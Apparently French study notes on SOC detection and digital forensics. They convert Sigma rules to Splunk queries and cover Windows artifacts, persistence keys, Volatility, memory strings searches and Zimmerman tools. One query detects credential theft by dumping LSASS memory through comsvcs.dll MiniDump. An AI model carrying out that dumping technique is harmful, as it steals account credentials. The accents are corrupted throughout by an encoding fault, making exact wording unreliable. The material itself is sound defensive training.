Cette commande gÃ©nÃ¨re la requÃªte **SPL** suivante :

```splunk
(TargetImage="*\\lsass.exe" SourceImage="C:\\Windows\\System32\\rundll32.exe" CallTrace="*comsvcs.dll*")
```

**Pour valider la rÃ¨gle dans Splunk :**

1. AccÃ©dez Ã  `http://[Target IP]:8000`.
2. Ouvrez l'application "Search & Reporting".
3. Soumettez la requÃªte de recherche **SPL** gÃ©nÃ©rÃ©e par **sigmac**.

**RÃ©sultat :**
La requÃªte SPL dÃ©tecte avec succÃ¨s l'abus de la fonction **MiniDump** pour dumper la mÃ©moire de **LSASS**.

---

### **Exemple 2 : Recherche de Processus Enfant Suspects LancÃ©s par Notepad**

Une autre rÃ¨gle **Sigma** nommÃ©e `proc_creation_win_notepad_susp_child.yml` est disponible dans le rÃ©pertoire :

```
C:\Rules\sigma
```

Cette rÃ¨gle Sigma dÃ©tecte les cas oÃ¹ **notepad.exe** lance des processus enfants suspects.

Pour convertir cette rÃ¨gle en SPL, nous utilisons **sigmac** comme suit :

```powershell
PS C:\Tools\sigma-0.21\tools> python sigmac -t splunk C:\Rules\sigma\proc_creation_win_notepad_susp_child.yml -c .\config\splunk-windows.yml
```

Cela produit la requÃªte **SPL** suivante :

```splunk
(ParentImage="*\\notepad.exe" (Image="*\\powershell.exe" OR Image="*\\pwsh.exe" OR Image="*\\cmd.exe" OR Image="*\\mshta.exe" OR Image="*\\cscript.exe" OR Image="*\\wscript.exe" OR Image="*\\taskkill.exe" OR Image="*\\regsvr32.exe" OR Image="*\\rundll32.exe" OR Image="*\\calc.exe"))
```

**Pour valider la rÃ¨gle dans Splunk :**

1. AccÃ©dez Ã  `http://[Target IP]:8000`.
2. Ouvrez l'application "Search & Reporting".
3. Soumettez la requÃªte **SPL** gÃ©nÃ©rÃ©e.

**RÃ©sultat :**
La requÃªte **SPL** dÃ©tecte les instances oÃ¹ **notepad.exe** lance des processus suspects, tels que **PowerShell**.

---

### ğŸ› ï¸ **Personnalisation de Sigma pour la CompatibilitÃ© avec le SIEM**

Dans de nombreux cas, les fichiers de configuration Sigma, situÃ©s dans le rÃ©pertoire suivant :

```
C:\Tools\sigma-0.21\tools\config
```

peuvent nÃ©cessiter des personnalisations pour gÃ©nÃ©rer des requÃªtes SIEM prÃ©cises et utilisables. Ces ajustements de configuration permettent de s'assurer que les rÃ¨gles traduites sont compatibles avec les champs de donnÃ©es et les structures de journaux du SIEM cible.

---

### ğŸ”‘ **Points ClÃ©s Ã  Retenir :**

* **Sigma** agit comme un traducteur universel qui permet de crÃ©er des rÃ¨gles communes pour diffÃ©rents systÃ¨mes SIEM.
* En convertissant les rÃ¨gles Sigma en **SPL** pour **Splunk**, nous pouvons valider facilement la dÃ©tection des comportements malveillants sur des plateformes spÃ©cifiques.
* **Personnaliser** les fichiers de configuration Sigma est crucial pour garantir que les rÃ¨gles traduites s'alignent avec les structures de donnÃ©es de votre environnement SIEM.

En utilisant cette mÃ©thode, vous pouvez tirer parti des rÃ¨gles Sigma pour renforcer la dÃ©tection des menaces dans votre environnement, tout en restant flexible face aux outils SIEM spÃ©cifiques.

---

```

## **Introduction to Digital Forensics**

## **Key Concepts**

```jsx
### Preuves Ã©lectroniques

La criminalistique numÃ©rique se concentre sur les preuves Ã©lectroniques, comprenant des fichiers, des e-mails, des journaux, des bases de donnÃ©es et du trafic rÃ©seau.
Les preuves peuvent provenir de diverses sources telles que des ordinateurs, des appareils mobiles, des serveurs, des services cloud et d'autres actifs numÃ©riques.

#### PrÃ©servation des preuves

La prÃ©servation de l'intÃ©gritÃ© et de l'authenticitÃ© des preuves numÃ©riques est primordiale.
Des procÃ©dures appropriÃ©es, y compris la documentation de la chaÃ®ne de custody, sont essentielles pour Ã©viter toute altÃ©ration accidentelle et garantir leur recevabilitÃ© lÃ©gale.

#### Processus forensique

Le processus forensique dans les enquÃªtes numÃ©riques comprend gÃ©nÃ©ralement plusieurs Ã©tapes clÃ©s :

1. **Identification** : DÃ©terminer les sources potentielles de preuves.
2. **Collecte** : Recueillir les donnÃ©es Ã  l'aide de mÃ©thodes forensiques adaptÃ©es.
3. **Examen** : Analyser les donnÃ©es collectÃ©es pour identifier les informations pertinentes.
4. **Analyse** : InterprÃ©ter les rÃ©sultats afin de comprendre l'incident.
5. **PrÃ©sentation** : PrÃ©senter les rÃ©sultats de maniÃ¨re claire et comprÃ©hensible.

#### Types de cas

La criminalistique numÃ©rique s'applique Ã  diffÃ©rents types d'enquÃªtes :

* **EnquÃªtes sur la cybercriminalitÃ©** : Cas impliquant des piratages, des fraudes ou du vol de donnÃ©es.
* **Vol de propriÃ©tÃ© intellectuelle** : Protection des informations propriÃ©taires.
* **Conduite inappropriÃ©e des employÃ©s** : EnquÃªtes internes.
* **Violation de donnÃ©es** : RÃ©ponse aux incidents de sÃ©curitÃ© affectant les organisations.
* **Soutien Ã  la procÃ©dure judiciaire** : Assistance dans les procÃ©dures lÃ©gales.

#### Ã‰tapes de base dans une enquÃªte forensique

1. **CrÃ©er une image forensique** : CrÃ©er une copie bit-Ã -bit du systÃ¨me pour l'analyse.
2. **Documenter l'Ã©tat du systÃ¨me** : Enregistrer les dÃ©tails tels que les processus actifs, les connexions ouvertes et les utilisateurs connectÃ©s.
3. **Identifier et prÃ©server les preuves** : SÃ©curiser toutes les donnÃ©es pouvant contenir des informations pertinentes.
4. **Analyser les preuves** : Chercher les Ã©lÃ©ments de donnÃ©es qui expliquent l'incident.
5. **Analyse de la chronologie** : Construire une chronologie pour comprendre la sÃ©quence des Ã©vÃ©nements.
6. **Identifier les indicateurs de compromission (IoC)** : Localiser les signes de compromission dans les donnÃ©es.
7. **Rapport et documentation** : CrÃ©er des rapports dÃ©taillant les rÃ©sultats et les actions menÃ©es.

#### La criminalistique numÃ©rique pour les analystes SOC

Dans un centre d'opÃ©rations de sÃ©curitÃ© (SOC), la criminalistique numÃ©rique joue un rÃ´le essentiel dans la rÃ©ponse et l'analyse des cybermenaces.

##### Analyse post-incident

* L'analyse forensique fournit une ventilation dÃ©taillÃ©e des incidents, aidant les analystes Ã  retracer les mÃ©thodes, les motifs et l'identitÃ© potentielle de l'attaquant.
* Ces informations aident Ã  amÃ©liorer les dÃ©fenses organisationnelles en identifiant les vulnÃ©rabilitÃ©s.

##### RÃ©ponse rapide aux incidents de sÃ©curitÃ©

* Les outils de criminalistique numÃ©rique permettent une analyse rapide de grands ensembles de donnÃ©es, facilitant l'identification rapide du moment de la compromission, des systÃ¨mes affectÃ©s et de la mÃ©thode d'attaque.
* La maÃ®trise rapide de la menace est essentielle pour limiter la portÃ©e et l'impact de l'incident.

##### ConsidÃ©rations lÃ©gales

* La criminalistique fournit des preuves lÃ©gales recevables, cruciales pour toute action en justice suite Ã  des violations importantes.
* Les preuves collectÃ©es sont enregistrÃ©es, hachÃ©es et horodatÃ©es afin d'assurer leur intÃ©gritÃ©, soutenant leur utilisation en tribunal si nÃ©cessaire.

##### Chasse proactive aux menaces

* La criminalistique numÃ©rique permet aux Ã©quipes SOC de rechercher de maniÃ¨re proactive des signes de compromission plutÃ´t que de se contenter de rÃ©pondre Ã  des alertes.
* Les incidents passÃ©s fournissent des IoC et des TTPs (tactiques, techniques et procÃ©dures) que les analystes peuvent utiliser pour rechercher des menaces potentielles.

##### AmÃ©lioration de la rÃ©ponse aux incidents

* Une analyse forensique complÃ¨te permet de mieux adapter les rÃ©ponses, garantissant que tous les systÃ¨mes compromis soient pris en compte.
* Comprendre l'ensemble de l'attaque rÃ©duit la probabilitÃ© que les attaquants rÃ©intÃ¨grent le systÃ¨me par la mÃªme vulnÃ©rabilitÃ©.

##### Apprentissage et amÃ©lioration continus

* Chaque incident offre des opportunitÃ©s d'apprentissage, aidant les Ã©quipes SOC Ã  rester en avance sur les techniques d'attaque en Ã©volution.
* En analysant les incidents passÃ©s, les analystes peuvent anticiper et se dÃ©fendre contre de nouvelles tactiques.

```

## **Windows Forensics Overview**

```jsx
### NTFS (New Technology File System)

NTFS est le systÃ¨me de fichiers de Microsoft, connu pour ses fonctionnalitÃ©s qui amÃ©liorent la performance, la sÃ©curitÃ© et l'intÃ©gritÃ© des donnÃ©es. Les artefacts forensiques clÃ©s incluent :

* **MÃ©tadonnÃ©es des fichiers** : Stocke les horodatages et les attributs des fichiers, utiles pour l'analyse de la chronologie des Ã©vÃ©nements.
* **EntrÃ©es MFT** : La Master File Table suit les mÃ©tadonnÃ©es de tous les fichiers, fournissant des dÃ©tails mÃªme sur les fichiers supprimÃ©s.
* **Slack de fichier et espace non allouÃ©** : Contient des rÃ©sidus de fichiers supprimÃ©s.
* **Signatures de fichiers** : UtilisÃ©es pour identifier les fichiers mÃªme si leurs extensions sont modifiÃ©es.
* **Journal USN** : Enregistre les changements de fichiers, utile pour enquÃªter sur les modifications.
* **Fichiers LNK** : Raccourcis qui rÃ©vÃ¨lent l'historique d'accÃ¨s aux fichiers et aux programmes.
* **Fichiers Prefetch** : Indiquent les programmes rÃ©cemment exÃ©cutÃ©s.
* **Hives du Registre** : Enregistrent les configurations du systÃ¨me et peuvent rÃ©vÃ©ler des traces de modifications non autorisÃ©es.
* **Shellbags** : Suivent la navigation dans les dossiers, en mettant en Ã©vidence les rÃ©pertoires consultÃ©s.
* **Cache de vignettes** : Stocke les aperÃ§us des images et documents rÃ©cemment visualisÃ©s.
* **Corbeille** : Conserve les fichiers supprimÃ©s, fournissant des informations sur les actions de l'utilisateur.
* **Flux de donnÃ©es alternatifs (ADS)** : DonnÃ©es cachÃ©es associÃ©es Ã  des fichiers, parfois exploitÃ©es par des malwares.
* **Copies de shadow de volume** : InstantanÃ©s du systÃ¨me de fichiers pour la rÃ©cupÃ©ration de donnÃ©es.
* **Descripteurs de sÃ©curitÃ© et ACL** : Stockent les permissions des fichiers, utiles pour analyser les droits d'accÃ¨s et les violations de sÃ©curitÃ©.

### Journaux des Ã©vÃ©nements Windows

Les **journaux des Ã©vÃ©nements Windows** enregistrent les Ã©vÃ©nements systÃ¨me et application, capturant une gamme d'activitÃ©s des utilisateurs et du systÃ¨me. SituÃ©s dans `C:\Windows\System32\winevt\logs`, ces journaux aident Ã  dÃ©tecter :

* **Erreurs systÃ¨me** : ProblÃ¨mes avec le systÃ¨me d'exploitation ou les applications.
* **Ã‰vÃ©nements de sÃ©curitÃ©** : Tentatives d'authentification, changements de politique et contrÃ´les d'accÃ¨s.
* **Ã‰vÃ©nements d'application** : Journaux provenant de logiciels spÃ©cifiques, souvent utiles pour identifier des tentatives d'exploitation.

### Artefacts d'exÃ©cution

Les **artefacts d'exÃ©cution** documentent les traces des programmes et scripts exÃ©cutÃ©s, offrant un aperÃ§u des actions des utilisateurs et des activitÃ©s de malwares. Les artefacts notables incluent :

* **Fichiers Prefetch** : Suivent les mÃ©tadonnÃ©es d'exÃ©cution (chemins des fichiers, nombre d'exÃ©cutions).
* **Shimcache** : Enregistre l'exÃ©cution des programmes pour la compatibilitÃ©, utile pour identifier les activitÃ©s rÃ©centes.
* **Amcache** : Stocke les dÃ©tails des exÃ©cutables (chemins des fichiers, signatures numÃ©riques, derniÃ¨re exÃ©cution).
* **UserAssist** : Suit les applications exÃ©cutÃ©es par l'utilisateur, affichant les noms, les comptes et les horodatages.
* **Listes RunMRU** : Enregistre les commandes et programmes rÃ©cemment exÃ©cutÃ©s.
* **Jump Lists** : Documente les fichiers et tÃ¢ches rÃ©cents associÃ©s aux applications.
* **Fichiers de raccourci (LNK)** : Fournissent les chemins d'exÃ©cution, les horodatages et les interactions avec l'utilisateur.
* **Ã‰lÃ©ments rÃ©cents** : Suivent les fichiers rÃ©cemment accÃ©dÃ©s.
* **Journaux des Ã©vÃ©nements Windows** : Enregistrent les Ã©vÃ©nements liÃ©s Ã  la crÃ©ation et la terminaison des processus.

### Persistance sur Windows

Les **mÃ©thodes de persistance** permettent aux attaquants de conserver l'accÃ¨s Ã  un systÃ¨me. Ces mÃ©thodes exploitent des composants systÃ¨me comme les clÃ©s de registre, les tÃ¢ches planifiÃ©es et les services.

#### ClÃ©s de registre pour la persistance

* **Run/RunOnce** :

  * `HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run`
  * `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run`
* **ClÃ©s WinLogon** :

  * `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon`
* **ClÃ©s de dÃ©marrage** :

  * `HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders`

#### TÃ¢ches planifiÃ©es (Schtasks)

Les tÃ¢ches planifiÃ©es dans `C:\Windows\System32\Tasks` sont stockÃ©es sous forme de fichiers XML, dÃ©taillant les horaires et les commandes des tÃ¢ches. Ces fichiers doivent Ãªtre examinÃ©s pour repÃ©rer les entrÃ©es suspectes.

#### Services

Les **services Windows** exÃ©cutent des processus en arriÃ¨re-plan. Les acteurs malveillants peuvent crÃ©er ou modifier des services pour maintenir la persistance. La clÃ© de registre pour les services est : `HKEY_LOCAL_MACHINE\System\CurrentControlSet\Services`.

### Forensique des navigateurs web

L'analyse des **navigateurs web** peut rÃ©vÃ©ler les habitudes de navigation, les interactions de l'utilisateur et des actions potentiellement nuisibles. Les artefacts clÃ©s incluent :

* **Historique de navigation** : Suit les sites visitÃ©s, les horodatages et la frÃ©quence.
* **Cookies** : Stocke les dÃ©tails de session, les prÃ©fÃ©rences et les donnÃ©es d'authentification.
* **Cache** : Contient les pages web et images en cache, montrant les sites accÃ©dÃ©s mÃªme si l'historique a Ã©tÃ© effacÃ©.
* **Favoris** : Indique les pages frÃ©quemment visitÃ©es.
* **Historique des tÃ©lÃ©chargements** : Liste les fichiers tÃ©lÃ©chargÃ©s, leurs URL d'origine et les horodatages.
* **DonnÃ©es de remplissage automatique** : Stocke les informations pour les formulaires (par exemple, noms, adresses).
* **DonnÃ©es de session** : Suivent les sessions actives, les onglets et les fenÃªtres ouvertes.
* **Extensions et modules complÃ©mentaires** : Liste des extensions installÃ©es et leurs configurations.

### SRUM (System Resource Usage Monitor)

Introduit dans Windows 8, **SRUM** suit l'utilisation des applications et des ressources. LocalisÃ© dans `C:\Windows\System32\sru\sru.db`, cette base de donnÃ©es SQLite enregistre les profils des applications et l'utilisation des ressources, aidant Ã  :

* **Profilage des applications** : Affiche les applications exÃ©cutÃ©es et leurs chemins.
* **Consommation des ressources** : Enregistre l'utilisation du CPU, du rÃ©seau et de la mÃ©moire.
* **Reconstruction de la chronologie** : Construit une chronologie de l'utilisation des applications et des Ã©vÃ©nements systÃ¨me.
* **Contexte utilisateur et systÃ¨me** : Associe les activitÃ©s Ã  des utilisateurs spÃ©cifiques, ce qui aide Ã  identifier les acteurs malveillants.
* **DÃ©tection des malwares** : Suivit les modÃ¨les inhabituels d'applications ou de ressources, ce qui peut indiquer la prÃ©sence de malwares.
* **RÃ©ponse aux incidents** : Fournit des informations rapides sur les activitÃ©s rÃ©centes pour une rÃ©ponse rapide aux menaces.

```

## **Evidence Acquisition Techniques & Tools**

```jsx
### Acquisition de preuves en criminalistique numÃ©rique

L'acquisition de preuves est cruciale en criminalistique numÃ©rique et implique la collecte minutieuse des donnÃ©es provenant de diverses sources pour en garantir l'authenticitÃ© et l'admissibilitÃ© lÃ©gale.

#### 1. Imagerie Forensique

L'imagerie forensique consiste Ã  crÃ©er une copie exacte, bit par bit, des supports de stockage, essentielle pour prÃ©server l'Ã©tat d'origine des donnÃ©es. Les outils pour l'imagerie forensique incluent :

* **FTK Imager** : Permet de crÃ©er des copies parfaites de disques, de visualiser et d'analyser des donnÃ©es sans altÃ©ration.
* **AFF4 Imager** : Outil open-source prenant en charge plusieurs systÃ¨mes de fichiers avec des capacitÃ©s d'imagerie compressÃ©e.
* **DD et DCFLDD** : Utilitaires en ligne de commande sous Unix ; DCFLDD inclut des amÃ©liorations spÃ©cifiques Ã  la criminalistique, comme le hachage.
* **Outils de Virtualisation** : UtilisÃ©s pour acquÃ©rir des images de environnements virtuels, souvent via des instantanÃ©s.

**Exemple : Imagerie avec FTK Imager**

1. SÃ©lectionner Fichier > CrÃ©er une Image Disque.
2. Choisir la source (disque physique/logique) et spÃ©cifier la destination.
3. DÃ©finir le type dâ€™image, la fragmentation et la compression, puis dÃ©marrer.
4. AprÃ¨s lâ€™imagerie, FTK Imager vÃ©rifie et rÃ©sume les rÃ©sultats.

**Exemple : Montage de lâ€™image disque avec Arsenal Image Mounter**

1. Lancer Arsenal Image Mounter en tant qu'administrateur.
2. Monter lâ€™image en mode lecture seule pour maintenir l'intÃ©gritÃ©.
3. Lâ€™image apparaÃ®t comme un lecteur, par exemple D:.

#### 2. Extraction de preuves basÃ©es sur lâ€™hÃ´te & Triage rapide

Les preuves basÃ©es sur lâ€™hÃ´te incluent les artefacts provenant des systÃ¨mes d'exploitation comme Windows, gÃ©nÃ©rÃ©s par l'exÃ©cution d'applications, les modifications de fichiers et l'activitÃ© des utilisateurs. L'acquisition des preuves se classe selon la volatilitÃ© des donnÃ©es :

* **DonnÃ©es Volatiles** : CapturÃ©es Ã  partir de la mÃ©moire active, elles incluent le contenu de la mÃ©moire vive, souvent porteur de traces de malwares.

  * **Outils d'acquisition de mÃ©moire** :

    * **WinPmem** : Outil open-source pour la capture de la mÃ©moire sur Windows.
    * **DumpIt** : Outil simple pour les captures de mÃ©moire sur Windows/Linux.
    * **MemDump** : Outil CLI pour capturer la RAM du systÃ¨me.
    * **Magnet RAM Capture** : Outil gratuit de capture de mÃ©moire de Magnet Forensics.

**Exemple : Acquisition de mÃ©moire avec WinPmem**

```bash
C:\Users\X\Downloads> winpmem_mini_x64_rc2.exe memdump.raw
```

* **DonnÃ©es Non-volatiles** : Persistant sur disque, elles incluent des entrÃ©es de registre, des journaux d'Ã©vÃ©nements Windows, et des artefacts systÃ¨me ou applicatifs.

**Triage rapide avec KAPE**

**KAPE** (Kroll Artifact Parser and Extractor) accÃ©lÃ¨re la collecte de preuves en rÃ©cupÃ©rant les artefacts essentiels.

1. **Cibles** : DÃ©finir les donnÃ©es Ã  collecter, stockÃ©es sous forme de fichiers .tkape dans le rÃ©pertoire KAPE\Targets.
2. **ExÃ©cution** :

   * DÃ©finir les chemins source (D:) et destination.
   * Utiliser gkape.exe (interface graphique) pour configurer les options et dÃ©marrer la collecte.
3. Les rÃ©sultats incluent \$MFT et d'autres rÃ©pertoires systÃ¨me dans le rÃ©pertoire de sortie.

**Collecte Ã  distance avec EDR & Velociraptor**

* **Solutions EDR** : Facilitent la collecte Ã  distance de preuves, avec des capacitÃ©s de recherche sur les rÃ©seaux.
* **Velociraptor** : Utilise des requÃªtes VQL et des recherches pour collecter des artefacts comme Windows.KapeFiles.Targets.

#### 3. Extraction de preuves rÃ©seau

Lâ€™analyse des preuves rÃ©seau est fondamentale pour les analystes SOC, impliquant des outils et des sources de donnÃ©es qui capturent et interprÃ¨tent le trafic rÃ©seau.

* **Capture de Trafic** : Des outils comme **Wireshark** et **tcpdump** capturent les paquets pour analyser la communication rÃ©seau.
* **SystÃ¨mes IDS/IPS** : Les systÃ¨mes IDS (Intrusion Detection Systems) dÃ©tectent, tandis que les systÃ¨mes IPS (Intrusion Prevention Systems) dÃ©tectent et bloquent les activitÃ©s suspectes.
* **DonnÃ©es de Flux de Trafic** : Des outils comme **NetFlow** fournissent des aperÃ§us du comportement du trafic Ã  un niveau global.
* **Journaux de Pare-feu** : Fournissent des informations sur les tentatives d'exploitation et les tentatives d'accÃ¨s non autorisÃ©es.

```

## **Memory Forensics**

```jsx
### Types de donnÃ©es en RAM utiles pour les enquÃªtes

* **Connexions rÃ©seau**
* **PoignÃ©es de fichiers et fichiers ouverts**
* **ClÃ©s du registre**
* **Processus en cours**
* **DLLs et pilotes chargÃ©s**
* **Historique des commandes de la console**
* **Identifiants des utilisateurs**
* **Artifacts de logiciels malveillants**
* **Configurations systÃ¨me**

### Processus de criminalistique mÃ©moire

#### Identification et vÃ©rification des processus

* Ã‰numÃ©rer les processus en cours, valider leurs origines et les comparer aux processus lÃ©gitimes connus.

#### Analyse des composants du processus

* Examiner les DLLs et poignÃ©es associÃ©es, rechercher des injections non autorisÃ©es.

#### Revue de l'activitÃ© rÃ©seau

* Analyser les connexions actives, les IP et les domaines pour retracer les communications externes.

#### DÃ©tection des injections de code

* Identifier des techniques comme l'hollowing de processus en examinant les anomalies de mÃ©moire.

#### DÃ©tection de rootkits

* Identifier des malwares profonds qui s'intÃ¨grent dans le systÃ¨me d'exploitation en utilisant des privilÃ¨ges Ã©levÃ©s.

#### Extraction des Ã©lÃ©ments suspects

* Isoler les composants suspects pour un examen forensique dÃ©taillÃ©.

### Le cadre Volatility

#### Vue d'ensemble

Volatility est un outil de criminalistique mÃ©moire open-source utilisÃ© sur diverses plateformes pour analyser des images mÃ©moire sur diffÃ©rents systÃ¨mes d'exploitation, tels que Windows, macOS et Linux.

#### Modules courants de Volatility

* **pslist** : Liste des processus en cours.
* **cmdline** : Affiche les arguments de ligne de commande.
* **netscan** : Identifie les connexions rÃ©seau.
* **malfind** : DÃ©tecte les codes malveillants dans les processus.
* **handles** : Liste des poignÃ©es ouvertes.
* **svcscan** : Analyse des services Windows.
* **dlllist** : Liste des DLLs chargÃ©es.
* **hivelist** : Liste des ruches du registre en mÃ©moire.

#### Exemples d'utilisation de Volatility

1. **Aide Ã  l'utilisation de Volatility :**

   ```bash
   vol.py --help
   ```

2. **Lister les processus en cours :**

   ```bash
   vol.py -f /path/to/memory.dump --profile=Win7SP1x64 pslist
   ```

3. **Analyse des artefacts rÃ©seau :**

   ```bash
   vol.py -f /path/to/memory.dump --profile=Win7SP1x64 netscan
   ```

4. **DÃ©tecter le code injectÃ© :**

   ```bash
   vol.py -f /path/to/memory.dump --profile=Win7SP1x64 malfind --pid=608
   ```

5. **Lister les DLLs chargÃ©es pour un processus spÃ©cifique :**

   ```bash
   vol.py -f /path/to/memory.dump --profile=Win7SP1x64 dlllist -p 1512
   ```

6. **Lister les services Windows :**

   ```bash
   vol.py -f /path/to/memory.dump --profile=Win7SP1x64 svcscan
   ```

#### DÃ©tection de rootkits avec les plugins psscan et pslist

Le plugin **psscan** rÃ©vÃ¨le les processus cachÃ©s par des rootkits :

```bash
vol.py -f /path/to/rootkit.dump psscan
```

#### Analyse mÃ©moire avec Strings

1. **Recherche dâ€™adresses IPv4 :**

   ```bash
   strings /path/to/memory.dump | grep -E "\b([0-9]{1,3}\.){3}[0-9]{1,3}\b"
   ```

2. **Extraction dâ€™adresses e-mails :**

   ```bash
   strings /path/to/memory.dump | grep -oE "\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Za-z]{2,4}\b"
   ```

3. **Artifacts de ligne de commande :**

   ```bash
   strings /path/to/memory.dump | grep -E "(cmd|powershell|bash)[^\s]+"
   ```

```

## **Disk Forensics**

```jsx
### FonctionnalitÃ©s ClÃ©s pour la Criminalistique sur Disque

* **Vue de la Structure des Fichiers** : Offre une vue navigable du systÃ¨me de fichiers, permettant un accÃ¨s rapide aux rÃ©pertoires et fichiers spÃ©cifiques. Cette fonctionnalitÃ© est essentielle pour localiser les fichiers suspects.
* **Visionneuse HexadÃ©cimale** : Permet l'inspection dÃ©taillÃ©e des fichiers au format hexadÃ©cimal, particuliÃ¨rement utile pour analyser des malwares personnalisÃ©s ou des exploits spÃ©cifiques.
* **Analyse des Artefacts Web** : Permet lâ€™analyse des donnÃ©es liÃ©es Ã  la navigation web, comme l'historique de navigation et les fichiers mis en cache, ce qui est crucial pour suivre les activitÃ©s menant Ã  un incident.
* **RÃ©cupÃ©ration des Emails** : Extrait et affiche les donnÃ©es des emails Ã  partir des images disque, ce qui est souvent prÃ©cieux lors de l'enquÃªte sur des menaces internes ou des attaques basÃ©es sur des communications.
* **Visionneuse d'Images** : Facilite l'affichage des images stockÃ©es sur le systÃ¨me, potentiellement utile pour des vÃ©rifications de politique ou pour identifier du contenu illÃ©gal.
* **Analyse des MÃ©tadonnÃ©es** : Fournit des informations sur les attributs des fichiers comme les dates de crÃ©ation, les heures de modification et les hachages. Ces dÃ©tails aident Ã  Ã©tablir une chronologie et Ã  les mettre en corrÃ©lation avec d'autres dÃ©couvertes, comme les activitÃ©s malveillantes.

---

### Autopsy : Vue d'Ensemble de l'Outil de Criminalistique

Autopsy est un outil de criminalistique numÃ©rique open-source qui repose sur le cadre Sleuth Kit. Il offre une interface conviviale avec des fonctionnalitÃ©s Ã©tendues que lâ€™on retrouve gÃ©nÃ©ralement dans les outils commerciaux, telles que :

* **Navigation des Sources de DonnÃ©es** : Permet d'explorer directement les fichiers et rÃ©pertoires au sein de l'image disque.
* **Examen des Artefacts Web** : Extrait des artefacts de navigation web, comme l'historique, les favoris et les fichiers mis en cache.
* **Analyse des PÃ©riphÃ©riques ConnectÃ©s** : Identifie et analyse les pÃ©riphÃ©riques externes connectÃ©s au systÃ¨me.
* **RÃ©cupÃ©ration des Fichiers SupprimÃ©s** : RÃ©cupÃ¨re les fichiers supprimÃ©s en scannant les secteurs du disque Ã  la recherche de donnÃ©es rÃ©siduelles.
* **Recherches par Mots-clÃ©s** : Permet d'effectuer des recherches approfondies sur le contenu du disque Ã  la recherche de mots-clÃ©s spÃ©cifiques.
* **Listes de Mots-clÃ©s** : Permet de rechercher de maniÃ¨re ciblÃ©e en utilisant des listes de mots-clÃ©s prÃ©dÃ©finies (par exemple, noms, IPs, indicateurs de compromission).
* **Analyse de la Chronologie** : Cartographie les Ã©vÃ©nements chronologiquement, facilitant ainsi la construction dâ€™une chronologie prÃ©cise pour lâ€™enquÃªte.

---

### Utilisation Pratique d'Autopsy dans l'Analyse Forensique

Une fois lâ€™image disque chargÃ©e dans Autopsy, les artefacts forensiques sont organisÃ©s dans la barre latÃ©rale, permettant un accÃ¨s efficace Ã  :

* **Sources de DonnÃ©es** : Vue de tous les fichiers et rÃ©pertoires.
* **Artefacts Web** : Vue ciblÃ©e sur lâ€™historique de navigation et les donnÃ©es associÃ©es.
* **Informations sur les PÃ©riphÃ©riques** : DÃ©tails sur les pÃ©riphÃ©riques externes connectÃ©s.
* **Fichiers SupprimÃ©s** : Fichiers rÃ©cupÃ©rÃ©s et fragments marquÃ©s comme supprimÃ©s.
* **Recherches par Mots-clÃ©s & Listes** : CapacitÃ©s de recherche approfondie.
* **Analyse de la Chronologie** : Affichage organisÃ© et chronologique des Ã©vÃ©nements systÃ¨me, essentiel pour comprendre la sÃ©quence des actions menant Ã  un incident.

---

Pour plus d'informations, consultez [Autopsy - Hack the Box Academy](https://academy.hackthebox.com/module/237/section/2611).

```

## **Rapid Triage Examination & Analysis Tools**

```jsx
### TÃ©lÃ©chargement et Installation

````
Utilisez le lien .net 4 ou .net 6 sur le site pour les tÃ©lÃ©chargements.
Alternativement, utilisez PowerShell :

```powershell
PS C:\Users\johndoe\Desktop\Get-ZimmermanTools> .\Get-ZimmermanTools.ps1
```

Cela tÃ©lÃ©charge tous les outils dans `C:\htb\dfir_module\tools`.
L'outil suit les mises Ã  jour par le biais de SHA-1 pour faciliter les mises Ã  jour.
````

### Les Temps MAC(b) sur NTFS

Les temps MAC(b) suivent les Ã©vÃ©nements du systÃ¨me de fichiers :

* **Temps ModifiÃ© (M)** : DerniÃ¨re modification du contenu.
* **Temps AccÃ©dÃ© (A)** : Dernier accÃ¨s au fichier.
* **Temps ChangÃ© (C)** : Modifications de la MFT.
* **Temps de CrÃ©ation (b)** : Heure de crÃ©ation originale du fichier.

#### Exemple de Commandes

**Utilisation de MFTECmd pour Inspecter les Fichiers \$MFT** :

```powershell
PS C:\Users\johndoe\Desktop\Get-ZimmermanTools\net6> .\MFTECmd.exe -f 'C:\Users\johndoe\Desktop\forensic_data\kape_output\D\$MFT' --de 0x16169
```

### AperÃ§u des Outils d'Investigation

#### Structure du Fichier MFT

La **Master File Table (MFT)** est essentielle pour suivre les fichiers sur un volume NTFS.
Les attributs du MFT comprennent **\$STANDARD\_INFORMATION** et **\$FILE\_NAME**.

#### Journaux des Ã‰vÃ©nements Windows

**EvtxECmd** pour analyser les journaux **EVTX** en CSV ou JSON :

```powershell
PS C:\Users\johndoe\Desktop\Get-ZimmermanTools\net6\EvtxeCmd> .\EvtxECmd.exe -f "chemin\vers\log.evtx" --csv "chemin_sortie"
```

Vous pouvez utiliser **Event Query Language (EQL)** pour interroger des journaux au format JSON.

#### Analyse du Registre Windows

**RegRipper** extrait des donnÃ©es spÃ©cifiques via des plugins :

```powershell
PS C:\Users\johndoe\Desktop\RegRipper3.0-master> .\rip.exe -r "C:\chemin\vers\hive" -p plugin_name
```

**Registry Explorer** fournit un accÃ¨s graphique au registre.

#### Artefacts d'ExÃ©cution de Programme

**Analyse Prefetch avec PECmd** :

```powershell
PS C:\Users\johndoe\Desktop\Get-ZimmermanTools\net6> .\PECmd.exe -f C:\chemin\vers\fichier_prefetch.pf
```

**ShimCache** et **Amcache** : AccÃ©dez Ã  ces artefacts via Registry Explorer pour l'historique des programmes.

### Analyse AvancÃ©e

* **Transcriptions PowerShell** : Examinez les commandes PowerShell inhabituelles.
* **Surveillance des API** : Les appels comme `getenv`, `CreateProcessA` et `RegOpenKeyExA` montrent des dÃ©tails d'interaction.

### Commandes ClÃ©s pour l'Analyse Forensique

#### Commandes PowerShell

Examinez les commandes rÃ©seau, les commandes encodÃ©es et les modules inhabituels.

#### Autres Scripts et Commandes Importants

**CrÃ©ation du format JSON EQL** :

```powershell
PS C:\Users\eqllib-master\utils> Get-WinEvent -Path "log_path" -Oldest | Get-EventProps | ConvertTo-Json
```

```

## **Practical Digital Forensics Scenario**

```jsx

#### AccÃ¨s au systÃ¨me cible

* **AccÃ¨s via RDP** : Connectez-vous Ã  l'IP cible avec les identifiants fournis.

